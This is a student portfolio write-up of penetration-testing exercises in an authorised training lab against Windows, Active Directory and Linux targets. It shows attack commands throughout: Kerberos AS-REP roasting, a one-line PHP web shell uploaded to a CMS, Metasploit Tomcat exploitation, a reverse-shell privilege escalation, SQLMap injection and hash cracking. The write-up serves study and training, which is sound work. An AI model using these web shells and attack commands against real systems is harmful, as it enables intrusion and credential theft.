# Practical Penetration Testing Lab

## Project Overview

This project documents a series of practical penetration-testing exercises completed within an authorised EC-Council iLabs environment as part of my Systems Penetration Testing studies.

The work provided hands-on experience across several stages of a penetration test, including:

- Host discovery
- Network scanning
- Service enumeration
- Operating system fingerprinting
- Active Directory enumeration
- Credential attacks
- Web application testing
- SQL injection
- Exploit research
- Remote command execution
- Windows privilege escalation
- Linux privilege escalation
- Post-exploitation

The project involved three separate target environments and demonstrated how individual weaknesses can be combined to create complete attack paths.

All testing was performed within an authorised laboratory environment.

---

# Penetration Testing Methodology

The exercises followed a structured testing process:

```text
Reconnaissance
      ↓
Host Discovery
      ↓
Port Scanning
      ↓
Service Enumeration
      ↓
Vulnerability Identification
      ↓
Exploitation
      ↓
Credential Recovery
      ↓
Privilege Escalation
      ↓
Post-Exploitation


One of the key lessons from this project was that successful penetration testing depends on correlating information from each stage rather than viewing vulnerabilities in isolation.

---

# Experience 1

## Windows, Active Directory and Web Application Testing

The first environment focused on identifying a Windows-based target, enumerating services and Active Directory information, recovering credentials and using a vulnerable web application to achieve remote command execution.

---

## 1. Full TCP Port Discovery

### Objective

The first stage was to identify the TCP services exposed by the target system and establish the initial attack surface.

### Technique

Nmap was used to scan all TCP ports:

```bash
nmap -p- 10.10.1.22
```

The `-p-` option instructs Nmap to scan all 65,535 TCP ports instead of only the default common ports

### Result

The scan identified several open ports associated with Windows networking and Active Directory services.

This information provided the foundation for more targeted service enumeration.

### Skills Demonstrated

- Full TCP port scanning
- Network reconnaissance
- Attack-surface identification
- Interpreting Nmap results

### Evidence

<img width="431" height="562" alt="Figure 1  Nmap full TCP port scan identifying open services on target 10 10 1 22" src="https://github.com/user-attachments/assets/8170dad5-52b4-46cc-b62b-72670107ba03" />

Figure 1. Nmap full TCP port scan identifying open services on target 10.10.1.22

## 2. Web Service Version Detection

### Objective

After identifying HTTP on port 80, I investigated the application and version running on the service.

### Technique

```bash
nmap -sV -p 80 10.10.1.22
```

The `-sV` option enables service version detection while `-p 80` restricts the scan to the HTTP service.

### Result

Nmap identified:

```text
Apache httpd 2.4.46
```

Identifying software versions is important because it allows a penetration tester to research configuration weaknesses and known vulnerabilities.

### Skills Demonstrated

- Service enumeration
- Version detection
- Targeted Nmap scanning
- Technology identification

### Evidence

<img width="635" height="201" alt="Figure 2  Nmap service version detection identifying Apache HTTP Server 2 4 46" src="https://github.com/user-attachments/assets/65852042-899c-470d-8ec7-23c9873d7f9f" />

Figure 2. Nmap service version detection identifying Apache HTTP Server 2.4.46

## 3. Operating System Fingerprinting

### Objective

The next stage was to identify the target operating system.

### Technique

```bash
nmap -O 10.10.1.22
```

The `-O` option enables Nmap operating system fingerprinting.

### Result

The scan indicated that the target was running:

```text
Microsoft Windows Server 2012 R2
```

The result was fingerprint-based and Nmap noted that the result may not have been fully reliable because the scan did not identify both an open and closed port.

### Skills Demonstrated

- OS fingerprinting
- Interpretation of scan confidence
- Windows infrastructure reconnaissance

### Evidence 

<img width="628" height="437" alt="Figure 3  Nmap operating system fingerprinting indicating Windows Server 2012 R2" src="https://github.com/user-attachments/assets/5963ae1d-f144-48df-bb87-6be086acb15d" />

Figure 3. Nmap operating system fingerprinting indicating Windows Server 2012 R2

## 4. Content Management System Identification

### Objective

The web service was investigated further to identify the Content Management System in use.

### Technique

```bash
nmap -p 80 --script http-generator 10.10.1.22
```

The Nmap Scripting Engine `http-generator` script checks a webpage for generator metadata.

### Result

The scan identified:

```text
Sitemagic CMS
```

This demonstrated how application-level information can be gathered using targeted NSE scripts.

### Skills Demonstrated

- Nmap Scripting Engine
- Web application enumeration
- CMS fingerprinting

### Evidence

<img width="628" height="289" alt="Figure 4  Nmap NSE enumeration identifying the Sitemagic CMS platform" src="https://github.com/user-attachments/assets/d6296b07-3b05-4526-8fda-6d902e9ebe48" />

Figure 4. Nmap NSE enumeration identifying the Sitemagic CMS platform

## 5. SMB and Active Directory Enumeration

### Objective

SMB was investigated to gather more information about the Windows and Active Directory environment.

### Technique

```bash
nmap -p 445 --script smb-os-discovery 10.10.1.22
```

### Result

The output revealed:

```text
Computer name: Careless
Domain: CyberQ.local
FQDN: Careless.CyberQ.local
```

The Active Directory domain information became particularly useful during the credential attack performed later in the assessment.

### Skills Demonstrated

- SMB enumeration
- Active Directory reconnaissance
- Domain identification
- NSE scripting

### Evidence

<img width="628" height="422" alt="Figure 5  SMB enumeration identifying the CyberQ local Active Directory domain" src="https://github.com/user-attachments/assets/09abba29-b08e-44be-b2a2-23fe369b3e9e" />

Figure 5. SMB enumeration identifying the CyberQ.local Active Directory domain

# 6. Kerberos AS-REP Roasting

### Objective

The Active Directory environment was assessed for accounts that did not require Kerberos pre-authentication.

### Technique

Impacket GetNPUsers was used:

```bash
impacket-GetNPUsers CyberQ.local/ -dc-ip 10.10.1.22 -request -format hashcat
```

The request returned an encrypted AS-REP response for a vulnerable account.

The resulting hash was then subjected to offline password cracking.

### Password Recovery

John the Ripper was used to inspect the cracked hash:

```bash
john --show hash.txt
```

### Result

The attack demonstrated how an Active Directory account configured without Kerberos pre-authentication may expose material that can be attacked offline.

### Skills Demonstrated

- Active Directory security testing
- Kerberos enumeration
- AS-REP roasting
- Offline password cracking
- Impacket
- John the Ripper

### Evidence

<img width="628" height="161" alt="Figure 6  Impacket GetNPUsers retrieving an AS-REP hash from the target domain" src="https://github.com/user-attachments/assets/71cba542-c9bd-442d-b4b6-0d8d37128d03" />

Figure 6.1. Impacket GetNPUsers retrieving an AS-REP hash from the CyberQ.local Active Directory domain

<img width="503" height="190" alt="Screenshot 2026-09-11 at 15 26 58" src="https://github.com/user-attachments/assets/7bb351d1-0709-4e77-a10b-05ab87d45924" />

Figure 6.2. John the Ripper confirming successful offline password recovery from the retrieved AS-REP hashFigure 6. Impacket GetNPUsers retrieving an AS-REP hash from the target domain


# 7. Web Application Exploitation and Remote Command Execution

### Objective

Recovered credentials were used to access the Sitemagic CMS.

The application's file management functionality was then assessed within the authorised lab environment.

### Technique

A simple PHP command shell was created:

```php
<?php system($_GET['cmd']); ?>
```

The file was uploaded to the CMS under:

```text
/files/images/
```

A command was then executed through the uploaded PHP file.

### Verification

The Windows command:

```text
whoami
```

returned:

```text
nt authority\system
```

This demonstrated that the web application was capable of executing operating-system commands with extremely high privileges.

### Security Impact

This exercise demonstrated the combined risk created by:

- Weak credentials
- Insecure file upload functionality
- Server-side code execution
- Excessive web-server privileges

### Skills Demonstrated

- Web application testing
- Authenticated exploitation
- File upload vulnerabilities
- Remote command execution
- Windows privilege identification

### Evidence

<img width="632" height="493" alt="Screenshot 2026-09-11 at 15 35 25" src="https://github.com/user-attachments/assets/eb6b5f9a-320f-448c-b08a-f47e39999184" />

Figure 7.1. Sitemagic CMS web application identified on the target web server

<img width="457" height="232" alt="Figure 7 2  Authenticated access to the Sitemagic CMS using recovered credentials" src="https://github.com/user-attachments/assets/a17e6883-4d95-4a85-8529-f757ab2b5b07" />

Figure 7.2. Authenticated access to the Sitemagic CMS using recovered credentials

<img width="451" height="103" alt="Screenshot 2026-09-21 at 15 11 08" src="https://github.com/user-attachments/assets/9083307c-08f4-41cf-b5b9-72949ec0800f" />

Figure 7.3. PHP command shell created in Kali for controlled remote command execution testing


# 8. Post-Exploitation

### Objective

The existing command execution capability was used to demonstrate access to protected system data.

### Technique

A Windows `type` command was issued against the Administrator desktop.

### Result

The test confirmed that the remote command execution capability could access files belonging to a privileged account.

This demonstrated the potential impact of the compromise beyond initial web application access.

### Skills Demonstrated

- Post-exploitation
- Windows file access
- Privilege validation
- Impact assessment

### Evidence

<img width="635" height="155" alt="Screenshot 2026-09-21 at 14 15 09" src="https://github.com/user-attachments/assets/293335db-42be-4597-9f2e-b667b4c5ad59" />

Figure 8. Post-exploitation access demonstrating retrieval of the protected Administrator file

---

# Experience 2

## Windows Exploitation and Privilege Escalation

The second environment focused on Apache Tomcat, Metasploit exploitation, post-exploitation enumeration and Windows privilege escalation.

---

# 1. Open Port Discovery

### Technique

```bash
nmap -p- --open 10.10.1.24
```

The `--open` option restricted the output to confirmed open ports.

### Result

The scan identified:

```text
5985/tcp
8080/tcp
```

These results were used to focus subsequent enumeration on the exposed services.

### Evidence

ADD SCREENSHOT HERE

Use your original Figure 21.

Suggested caption:

> Full TCP scan showing confirmed open services on the Windows lab target.

---

# 2. Apache Tomcat Enumeration

### Technique

```bash
nmap -sV -p 8080 10.10.1.24
```

### Result

The web service was identified as:

```text
Apache Tomcat 9.0.37
```

This information allowed more focused investigation of the Tomcat management interface.

### Evidence

<img width="631" height="233" alt="Screenshot 2026-09-21 at 14 16 07" src="https://github.com/user-attachments/assets/03ccc70b-5c86-4f47-8c1c-ec65ced05fae" />

Figure 1. Nmap full TCP scan identifying ports 5985 and 8080 as open on target 10.10.1.24

---

# 3. Tomcat Manager Exploitation

### Objective

The Tomcat Manager interface was assessed for weak authentication and exploitable functionality.

### Metasploit Research

The following command was used:

```text
search tomcat upload
```

This identified:

```text
exploit/multi/http/tomcat_mgr_upload
```

### Credential Testing

A Tomcat Manager login scanner identified valid default credentials.

The upload exploit was then configured with:

```text
RHOSTS
RPORT
TARGETURI
USERNAME
PASSWORD
```

### Result

The exploit successfully uploaded and executed a Java payload, producing a Meterpreter session.

The compromised account was identified as:

```text
cloud\jack
```

### Skills Demonstrated

- Metasploit
- Authentication testing
- Default credential identification
- Tomcat exploitation
- Meterpreter
- Remote access

### Evidence

<img width="631" height="390" alt="Screenshot 2026-09-21 at 14 18 03" src="https://github.com/user-attachments/assets/880aad02-5935-4550-a1a2-fe8b8c46d9bc" />

Figure 3.1. Metasploit search identifying the Apache Tomcat Manager upload exploit module



<img width="628" height="534" alt="Screenshot 2026-09-21 at 14 18 57" src="https://github.com/user-attachments/assets/95723aa1-13f6-48fe-86c4-b61968f6703c" />

Figure 3.2. Initial Metasploit Tomcat Manager exploit configuration during testing


<img width="635" height="526" alt="Screenshot 2026-09-21 at 14 19 35" src="https://github.com/user-attachments/assets/465235a3-5b0c-4cf2-95b2-f0123b87d1ed" />

Figure 3.3. Tomcat Manager authentication testing confirming valid default credentials


<img width="629" height="522" alt="Screenshot 2026-09-21 at 14 20 19" src="https://github.com/user-attachments/assets/da6a5fe8-b7a9-4f9f-8b0d-a32e82527303" />

Figure 3.4. Corrected Metasploit Tomcat Manager exploit configuration with target and payload settings


<img width="629" height="539" alt="Screenshot 2026-09-21 at 14 20 59" src="https://github.com/user-attachments/assets/d85e12fa-c044-4f56-8900-0bf4e34dfc01" />

Figure 3.5. Successful Meterpreter session established through Apache Tomcat exploitation

<img width="631" height="527" alt="Screenshot 2026-09-21 at 14 21 34" src="https://github.com/user-attachments/assets/18cdfb88-f50f-44bd-a4f4-735c783b87a8" />

Figure 3.6. Post-exploitation enumeration confirming the compromised Windows user context and locating user.txt


---

# 4. Post-Exploitation File Access

Once a Meterpreter session had been established, the compromised system was searched for user-accessible data.

The Windows command:

```text
where /r C:\ user.txt
```

was used to locate the file.

The file could then be read through the established shell.

### Skills Demonstrated

- Post-exploitation
- Windows filesystem enumeration
- Remote shell operation

### Evidence

<img width="632" height="85" alt="Screenshot 2026-09-21 at 14 22 18" src="https://github.com/user-attachments/assets/a03e634e-b11c-40d4-adea-184d0cb0b99b" />

Figure 4. Post-exploitation file access through the established Meterpreter session

---

# 5. Installed Software Enumeration

### Objective

The compromised system was inspected for locally installed software that might offer opportunities for further privilege escalation.

### Commands

```text
dir "C:\Program Files (x86)" /b | findstr /i cloudme
```

and:

```text
dir /s /b "C:\Program Files (x86)\CloudMe\*.txt"
```

The application licence file was inspected using:

```text
type
```

### Result

CloudMe Sync version:

```text
1.11.0
```

was identified.

### Evidence

<img width="634" height="425" alt="Screenshot 2026-09-21 at 14 23 08" src="https://github.com/user-attachments/assets/ecfa51f9-7123-44b2-b022-b508eb09c5e8" />

Figure 5.1. Windows filesystem enumeration identifying the installed CloudMe application


<img width="634" height="340" alt="Screenshot 2026-09-21 at 14 23 51" src="https://github.com/user-attachments/assets/e847a502-7169-4323-a474-ca6fbfd7ca19" />

Figure 5.2. CloudMe licence information confirming CloudMe Sync version 1.11.0

****
---

# 6. Vulnerability Research with SearchSploit

### Objective

The identified software version was researched for publicly documented vulnerabilities.

### Technique

```bash
searchsploit cloudme
```

### Result

SearchSploit identified:

```text
CloudMe Sync 1.11.0 - Local Buffer Overflow
```

This demonstrated a typical vulnerability-research workflow:

```text
Application Discovery
        ↓
Version Identification
        ↓
Exploit Research
        ↓
Exploit Validation
```

### Skills Demonstrated

- Exploit research
- SearchSploit
- Version correlation
- Vulnerability identification

### Evidence

<img width="628" height="316" alt="Screenshot 2026-09-21 at 14 24 51" src="https://github.com/user-attachments/assets/814f8117-4e67-4e6d-ab96-d3a07a7c49db" />

Figure 6. SearchSploit identifying a local buffer overflow affecting CloudMe Sync 1.11.0

---

# 7. Windows Privilege Escalation

### Objective

The identified CloudMe vulnerability was used in the controlled laboratory environment to demonstrate vertical privilege escalation.

### Technique

A modified exploit containing a reverse-shell payload was prepared.

A Netcat listener was configured on Kali:

```bash
nc -lvnp 5555
```

The exploit was transferred to the compromised Windows host and executed.

### Result

A reverse connection was received.

The `whoami` command returned:

```text
cloud\administrator
```

This demonstrated successful vertical privilege escalation from:

```text
cloud\jack
```

to:

```text
cloud\administrator
```

### Skills Demonstrated

- Windows privilege escalation
- Exploit modification
- Reverse shells
- Netcat
- Payload generation
- Post-exploitation

### Evidence

<img width="633" height="120" alt="Screenshot 2026-09-21 at 14 25 46" src="https://github.com/user-attachments/assets/662e36cf-268e-40f9-a026-74c66c4a097c" />

Figure 7.1. CloudMe exploit and reverse-shell payload prepared on the Kali attack system


<img width="447" height="556" alt="Screenshot 2026-09-21 at 14 27 09" src="https://github.com/user-attachments/assets/532479a1-3e11-4200-a7b8-932f06516d27" />

Figure 7.2. CloudMe exploit modified to include the generated reverse-shell payload


<img width="285" height="124" alt="Screenshot 2026-09-21 at 14 27 44" src="https://github.com/user-attachments/assets/1685cbc1-d17f-43c4-87c8-52170bb23c1c" />

Figure 7.3. Netcat listener configured on Kali to receive the reverse-shell connection


<img width="452" height="178" alt="Screenshot 2026-09-21 at 14 28 26" src="https://github.com/user-attachments/assets/f1813b65-bb87-4050-bf10-06030768d73f" />

Figure 7.4. Modified CloudMe exploit transferred to the compromised Windows target through Meterpreter


<img width="450" height="272" alt="Screenshot 2026-09-21 at 14 29 11" src="https://github.com/user-attachments/assets/a4c7bc2b-d0f4-43bd-b87e-efe21752aac0" />

Figure 7.5. Reverse shell successfully established with cloud\administrator privileges


<img width="448" height="374" alt="Screenshot 2026-09-21 at 14 29 34" src="https://github.com/user-attachments/assets/b335b4d3-31a3-4c09-a021-f9a38eec10f2" />

Figure 7.6. Administrator-level filesystem enumeration locating the protected root.txt file

---

# 8. Privileged Post-Exploitation

Administrator-level access allowed protected system resources to be accessed.

This confirmed that successful privilege escalation had significantly increased the impact of the original compromise.

### Evidence

<img width="445" height="77" alt="Screenshot 2026-09-21 at 14 30 25" src="https://github.com/user-attachments/assets/05f5648c-23e1-4034-b708-f713c1fd5140" />

Figure 8. Privileged post-exploitation access demonstrating successful retrieval of the Administrator-level file


---

# Experience 3

## Linux, Web Application and SQL Injection Testing

The third environment combined network reconnaissance, SQL injection, credential recovery, SSH access and Linux privilege escalation.

---

# 1. Host Discovery

### Technique

The Kali attack machine address was first confirmed:

```bash
ip -br addr
```

The subnet was then scanned:

```bash
nmap -sn 10.10.1.0/24
```

The `-sn` option performs host discovery without a full port scan.

### Result

The target system was identified among the live hosts on the laboratory subnet.

### Evidence

<img width="448" height="387" alt="Screenshot 2026-09-21 at 14 31 06" src="https://github.com/user-attachments/assets/e6f9bb57-70e3-40bb-b989-9ce9d26c000e" />

Figure 1. Kali network configuration and Nmap host discovery identifying live systems within the authorised lab subnet

---

# 2. Full TCP Port and Service Discovery

### Full Port Scan

```bash
nmap -p- 10.10.1.32
```

The scan identified:

```text
22/tcp
80/tcp
```

### Service Version Detection

```bash
nmap -sV -p 22,80 10.10.1.32
```

The resulting services included:

```text
OpenSSH 7.6p1
Apache httpd 2.4.29
```

### Evidence

<img width="454" height="459" alt="Screenshot 2026-09-21 at 14 32 40" src="https://github.com/user-attachments/assets/8fefe4ce-8cb5-4330-b6f8-635b366a7c84" />

Figure 2. Nmap full TCP port scan identifying SSH and HTTP services on target 10.10.1.32

---

# 3. Web Application Parameter Testing

### Objective

The target web application was inspected for user-controlled parameters that could represent potential injection points.

A request included the parameter:

```text
pageid
```

### Evidence

<img width="453" height="420" alt="Screenshot 2026-09-21 at 14 33 42" src="https://github.com/user-attachments/assets/91e8fa8f-bf53-4833-be5c-4b1b447f524d" />

Figure 3. Nmap service enumeration confirming Apache HTTP Server 2.4.29 on TCP port 80

---

# 4. SQL Injection Identification

### Technique

The HTTP request was saved and supplied to SQLMap:

```bash
sqlmap -r req.txt --batch
```

### Result

SQLMap confirmed that the `pageid` parameter was vulnerable to SQL injection.

Multiple techniques were identified, including:

- Boolean-based blind
- Error-based
- Time-based blind
- UNION query injection

The backend database was identified as MySQL.

### Skills Demonstrated

- Web application testing
- SQL injection testing
- SQLMap
- Request analysis
- Database fingerprinting

### Evidence

<img width="453" height="292" alt="Screenshot 2026-09-21 at 14 34 28" src="https://github.com/user-attachments/assets/d88604b3-808c-4972-b591-3988c1ad885f" />

Figure 4.1. HTTP request identifying the pageid GET parameter for SQL injection testing

<img width="453" height="329" alt="Screenshot 2026-09-21 at 14 35 26" src="https://github.com/user-attachments/assets/916c2d20-4a5d-4123-968b-db72368a75ca" />

Figure 4.2. SQLMap analysing the captured request and testing the pageid parameter for SQL injection

<img width="450" height="210" alt="Screenshot 2026-09-21 at 14 35 54" src="https://github.com/user-attachments/assets/9d5f41e1-0aa0-432a-9392-233c7283e845" />

Figure 4.3. SQLMap confirming multiple SQL injection techniques against the vulnerable pageid parameter


---

# 5. Database Enumeration and Credential Recovery

### Objective

The SQL injection vulnerability was used to enumerate database information and recover a password hash belonging to a system user.

The recovered hash was then subjected to offline analysis using Hashcat.

### Hashcat

Hashcat was configured for MD5:

```bash
hashcat -m 0 -a 3 <hash-file> <mask>
```

### Result

The recovered credentials were validated through SSH access.

This produced a complete attack path:

```text
Web Application
      ↓
SQL Injection
      ↓
Database Enumeration
      ↓
Password Hash Recovery
      ↓
Offline Password Cracking
      ↓
Valid Credentials
      ↓
SSH Access
```

### Skills Demonstrated

- Database enumeration
- Credential extraction
- Password hash cracking
- Hashcat
- Credential validation
- SSH

### Evidence

<img width="453" height="300" alt="Screenshot 2026-09-21 at 14 36 36" src="https://github.com/user-attachments/assets/f015c77a-2e34-452a-b765-06ef05f2b4d1" />

Figure 5.1. Hashcat configured for offline cracking of the recovered MD5 password hash

<img width="451" height="510" alt="Screenshot 2026-09-21 at 14 37 09" src="https://github.com/user-attachments/assets/8ed8d709-57f3-4db8-9e28-cd8c7f0a32be" />

Figure 5.2. Hashcat confirming successful recovery of the plaintext password


<img width="451" height="551" alt="Screenshot 2026-09-21 at 14 37 49" src="https://github.com/user-attachments/assets/93870b5f-903f-4e0c-bb8e-8e8655b2d884" />

Figure 5.3. Successful SSH authentication using the recovered credentials


---

# 6. Linux System Enumeration

After authenticated SSH access was established, the system login banner revealed the operating system as:

```text
Ubuntu 18.04.4 LTS
```

This provided further context about the target environment and demonstrated how authenticated access can reveal information that may not always be available through remote fingerprinting.

### Evidence

<img width="451" height="552" alt="Screenshot 2026-09-21 at 14 38 32" src="https://github.com/user-attachments/assets/ef1fc5ac-aae9-472e-b0ba-70d44ee896e4" />

Figure 6. Authenticated SSH session identifying the target as Ubuntu 18.04.4 LTS

---

# 7. Linux Post-Exploitation

The filesystem was searched using:

```bash
find / -type f -name user.txt 2>/dev/null
```

The command recursively searches the filesystem while suppressing permission errors.

The discovered file was then inspected using:

```bash
cat /home/cyberq_user/user.txt
```

### Skills Demonstrated

- Linux filesystem enumeration
- Shell navigation
- Post-exploitation
- Command-line proficiency

### Evidence

<img width="447" height="422" alt="Screenshot 2026-09-21 at 14 39 09" src="https://github.com/user-attachments/assets/3bdfc481-a3be-4db3-96b9-58745f9f0c0e" />

Figure 7. Linux filesystem enumeration locating and reading the user-level file


---

# 8. Linux Privilege Escalation

### Objective

The compromised user's sudo privileges were examined.

### Technique

```bash
sudo -l
```

This revealed that the user was permitted to run:

```text
/bin/nano
```

with root privileges.

### Result

The overly permissive sudo rule allowed access to root-owned resources.

This demonstrated how poor sudo configuration can provide a direct vertical privilege-escalation route.

### Skills Demonstrated

- Linux privilege escalation
- Sudo enumeration
- Least-privilege assessment
- Linux permissions
- Post-exploitation

### Evidence

<img width="451" height="460" alt="Screenshot 2026-09-21 at 14 39 47" src="https://github.com/user-attachments/assets/a1a54fe9-8241-4129-88c0-747e7c0af5fd" />

Figure 8.1. Sudo enumeration identifying that the compromised user can execute Nano with root privileges

<img width="449" height="220" alt="Screenshot 2026-09-21 at 14 40 15" src="https://github.com/user-attachments/assets/0f370699-c739-4f03-be10-6ff1f78d67e3" />

Figure 8.2. Root-level file access through the permitted Nano sudo configuration


---

# Tools Used

| Tool | Purpose |
|---|---|
| Kali Linux | Penetration-testing platform |
| Nmap | Host, port, service and OS discovery |
| Nmap NSE | Web, SMB and application enumeration |
| Impacket | Active Directory and Kerberos testing |
| John the Ripper | Offline password recovery |
| Metasploit | Exploitation and payload management |
| Meterpreter | Post-exploitation |
| SearchSploit | Vulnerability and exploit research |
| msfvenom | Payload generation |
| Netcat | Reverse-shell listener |
| SQLMap | SQL injection identification and exploitation |
| Hashcat | Password hash recovery |
| SSH | Authenticated remote access |
| Linux CLI | Enumeration and privilege escalation |

---

# Skills Developed

This project developed practical experience in:

- Network reconnaissance
- Host discovery
- TCP port scanning
- Service version detection
- Operating system fingerprinting
- Web application enumeration
- Active Directory enumeration
- Kerberos security testing
- Password attacks
- Exploit research
- Vulnerability exploitation
- SQL injection
- Database enumeration
- Windows post-exploitation
- Linux post-exploitation
- Windows privilege escalation
- Linux privilege escalation
- Remote command execution
- Technical evidence collection
- Penetration-test reporting

---

# Key Learning

This project strengthened my understanding that penetration testing is not simply a collection of individual tools or commands.

The strongest attack paths developed when information collected during one phase was used to inform the next.

For example:

```text
Port Discovery
      ↓
Service Enumeration
      ↓
Active Directory Discovery
      ↓
Authentication Weakness
      ↓
Credential Recovery
      ↓
Web Application Access
      ↓
Remote Command Execution
```

Another environment demonstrated:

```text
SQL Injection
      ↓
Database Enumeration
      ↓
Password Hash Recovery
      ↓
Credential Cracking
      ↓
SSH Access
      ↓
Linux Privilege Escalation
```

These exercises helped me understand how relatively small weaknesses can combine to create significant organisational risk.

They also reinforced the importance of maintaining detailed evidence throughout a penetration test, including command output, screenshots and clear technical explanations. 

---

# Ethical Use

All penetration-testing activity documented in this repository was performed within an authorised EC-Council iLabs training environment.

The material is presented solely to demonstrate my practical cyber security learning and professional development.

The techniques shown should only be used against systems where explicit permission to conduct security testing has been granted.

---

# About This Portfolio Project

This project forms part of my continuing development towards a career in penetration testing and offensive security.

I am particularly interested in understanding not only how vulnerabilities can be identified and exploited, but how individual technical weaknesses combine to create wider organisational risk.

My ongoing development includes practical laboratory work, independent security projects and continued study of network, infrastructure and application security.
